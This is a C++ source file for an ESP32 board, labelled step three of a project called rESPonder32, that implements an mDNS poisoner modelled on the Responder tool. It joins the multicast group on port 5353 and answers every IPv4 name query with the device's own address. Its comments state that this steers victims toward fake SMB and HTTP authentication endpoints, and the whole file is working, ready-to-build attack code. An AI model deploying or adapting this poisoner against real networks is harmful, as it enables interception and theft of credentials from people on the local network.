// rESPonder32 — Step 3: mDNS Poisoner
//
// Binds to 224.0.0.251:5353 (multicast), responds to every A-record query
// with our IP. Windows and macOS fall back to mDNS for .local names; this
// sketch answers all of them, steering connections to our fake SMB/HTTP
// auth endpoints (later steps).
//
// Protocol: RFC 6762 — Multicast DNS
// Packet format: DNS wire format; mDNS deviates from LLMNR in several
//                critical ways — see field comments in buildMDNSResponse().
//
// Build & run (emulator):
//   cd /home/machine/esp32emu && ./esp32emu run src/mdns_poisoner.cpp

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUDP.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

static const char*    WIFI_SSID  = "YourSSID";
static const char*    WIFI_PASS  = "YourPassword";

static const IPAddress MDNS_MCAST(224, 0, 0, 251);
static const uint16_t  MDNS_PORT  = 5353;

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------

WiFiUDP mdnsUDP;
static uint8_t ourIP[4] = {127, 0, 0, 1};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// Returns this host's outbound LAN IP without sending any packets.
static void detectHostIP(uint8_t out[4]) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;

    struct sockaddr_in dst{};
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dst.sin_addr);

    if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) == 0) {
        struct sockaddr_in local{};
        socklen_t len = sizeof(local);
        if (getsockname(s, (struct sockaddr*)&local, &len) == 0) {
            uint8_t* b = (uint8_t*)&local.sin_addr.s_addr;
            out[0] = b[0]; out[1] = b[1]; out[2] = b[2]; out[3] = b[3];
        }
    }
    close(s);
}

// Parse a multi-label DNS name starting at buf[offset].
// Handles the 'hostname.local.' structure Windows sends.
// Writes dotted-label form to name_out. Returns bytes consumed including
// the terminal 0x00, or -1 on malformed input.
static int parseDnsName(const uint8_t* buf, int len, int offset,
                        char* name_out, int name_max) {
    int pos   = offset;
    int out   = 0;
    bool first = true;

    while (pos < len) {
        uint8_t label_len = buf[pos++];
        if (label_len == 0) break;
        if (label_len > 63) return -1;  // pointer compression: ignore, not sent by Windows
        if (pos + label_len > len) return -1;

        if (!first && out < name_max - 1) name_out[out++] = '.';
        for (int i = 0; i < label_len && out < name_max - 1; i++)
            name_out[out++] = (char)buf[pos + i];

        pos  += label_len;
        first = false;
    }
    name_out[out] = '\0';
    return pos - offset;
}

// ---------------------------------------------------------------------------
// Packet builder
// ---------------------------------------------------------------------------

// Build an mDNS A-record response into dst.
//
// Critical differences from LLMNR (Responder MDNS_Ans class):
//   - Transaction ID is always 0x0000, never echoed
//   - Flags = 0x8400: QR=1 (response) + AA=1 (authoritative) — not 0x8000
//   - QDCOUNT = 0: question section is never repeated in the response
//   - TTL = 120 s (0x00000078) — not 30 like LLMNR
//   - Answer name = data[12 : len(data)-5], i.e. the wire-encoded name
//     from the question section, minus the trailing 5 bytes
//     (0x00 null label + 2-byte QTYPE + 2-byte QCLASS)
//
// Returns bytes written, or -1 if the packet should be ignored.
static int buildMDNSResponse(const uint8_t* query, int qlen,
                              uint8_t* dst,   int dstmax,
                              const uint8_t* our_ip4) {
    if (qlen < 12) return -1;

    uint16_t flags = ((uint16_t)query[2] << 8) | query[3];

    // Responder checks QR bit: if set, this is a response, not a query.
    // Never reply to responses — that causes loops on the multicast group.
    if (flags & 0x8000) return -1;

    uint16_t qdcnt = ((uint16_t)query[4] << 8) | query[5];
    if (qdcnt == 0) return -1;

    // Parse name to determine QTYPE and log the name.
    // The name field starts at byte 12 per Responder's Parse_MDNS_Name.
    char dummy[256];
    int name_bytes = parseDnsName(query, qlen, 12, dummy, sizeof(dummy));
    if (name_bytes < 0) return -1;

    int qtype_off = 12 + name_bytes;
    if (qtype_off + 4 > qlen) return -1;

    uint16_t qtype = ((uint16_t)query[qtype_off] << 8) | query[qtype_off + 1];
    // Only respond to A queries (IPv4). AAAA (0x001c) and others are ignored.
    if (qtype != 0x0001) return -1;

    // Answer name: Poisoned_MDNS_Name() = data[12 : len(data)-5]
    // The 5 stripped bytes are: 0x00 (null label) + QTYPE (2) + QCLASS (2).
    // We copy the name labels without the question suffix.
    int ans_name_len = qlen - 12 - 5;
    if (ans_name_len <= 0) return -1;

    int w = 0;
    auto put16 = [&](uint16_t v) {
        if (w + 2 <= dstmax) { dst[w++] = (uint8_t)(v >> 8); dst[w++] = (uint8_t)(v & 0xFF); }
    };
    auto put32 = [&](uint32_t v) {
        put16((uint16_t)(v >> 16)); put16((uint16_t)(v & 0xFFFF));
    };
    auto putBuf = [&](const uint8_t* src, int n) {
        for (int i = 0; i < n && w < dstmax; i++) dst[w++] = src[i];
    };

    // Response header (12 bytes)
    put16(0x0000);  // Transaction ID: always 0x0000 in mDNS (Responder MDNS_Ans)
    put16(0x8400);  // Flags: QR=1, AA=1 (authoritative answer) — 0x8000 would be wrong here
    put16(0);       // QDCOUNT = 0: question section suppressed in mDNS responses
    put16(1);       // ANCOUNT = 1
    put16(0);       // NSCOUNT = 0
    put16(0);       // ARCOUNT = 0

    // Answer name: labels from query[12..qlen-5], no terminal null/QTYPE/QCLASS.
    // Responder: AnswerName = data[12:] then data[:len(data)-5].
    // We write exactly those bytes; the A record type below closes it.
    putBuf(query + 12, ans_name_len);
    // Append the null label that was stripped — the name in the answer record
    // must still be a valid DNS name (terminated with 0x00).
    if (w < dstmax) dst[w++] = 0x00;

    // Resource record fields
    put16(0x0001);       // TYPE  = A
    put16(0x0001);       // CLASS = IN
    put32(0x00000078);   // TTL = 120 s (0x78 = 120, Responder MDNS_Ans default)
    put16(4);            // RDLENGTH = 4
    putBuf(our_ip4, 4);  // RDATA: our IPv4 address

    return w;
}

// ---------------------------------------------------------------------------
// Arduino entry points
// ---------------------------------------------------------------------------

void setup() {
    Serial.begin(115200);
    Serial.println("\n[rESPonder32] mDNS Poisoner v0.1");

    WiFi.mode(WIFI_STA);
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    Serial.print("[rESPonder32] Connecting to WiFi");
    while (WiFi.status() != WL_CONNECTED) {
        delay(100);
        Serial.print('.');
    }
    Serial.println();

    detectHostIP(ourIP);
    Serial.printf("[rESPonder32] Host IP: %d.%d.%d.%d\n",
                  ourIP[0], ourIP[1], ourIP[2], ourIP[3]);

    if (!mdnsUDP.beginMulticast(MDNS_MCAST, MDNS_PORT)) {
        Serial.println("[rESPonder32] ERROR: failed to bind mDNS socket");
        return;
    }

    Serial.println("[rESPonder32] Listening on 224.0.0.251:5353 (mDNS)");
    Serial.println("[rESPonder32] Poisoning all mDNS A queries -> ready");
}

void loop() {
    int plen = mdnsUDP.parsePacket();
    if (plen <= 0) {
        delay(1);
        return;
    }

    uint8_t buf[512];
    int n = mdnsUDP.read(buf, sizeof(buf));
    if (n < 12) return;

    IPAddress src     = mdnsUDP.remoteIP();
    uint16_t  srcPort = mdnsUDP.remotePort();

    uint16_t flags = ((uint16_t)buf[2] << 8) | buf[3];
    if (flags & 0x8000) return;  // mDNS response packet, not a query

    char name[256] = "(unknown)";
    parseDnsName(buf, n, 12, name, sizeof(name));

    Serial.printf("[mDNS] Query from %d.%d.%d.%d:%d for '%s'\n",
                  src[0], src[1], src[2], src[3], srcPort, name);

    uint8_t resp[512];
    int rlen = buildMDNSResponse(buf, n, resp, sizeof(resp), ourIP);
    if (rlen <= 0) {
        Serial.printf("[mDNS] Skipped (not an A query, response bit set, or parse error)\n");
        return;
    }

    mdnsUDP.beginPacket(src, srcPort);
    mdnsUDP.write(resp, (size_t)rlen);
    mdnsUDP.endPacket();

    Serial.printf("[mDNS] Poisoned -> %d.%d.%d.%d (%d bytes)\n",
                  ourIP[0], ourIP[1], ourIP[2], ourIP[3], rlen);
}
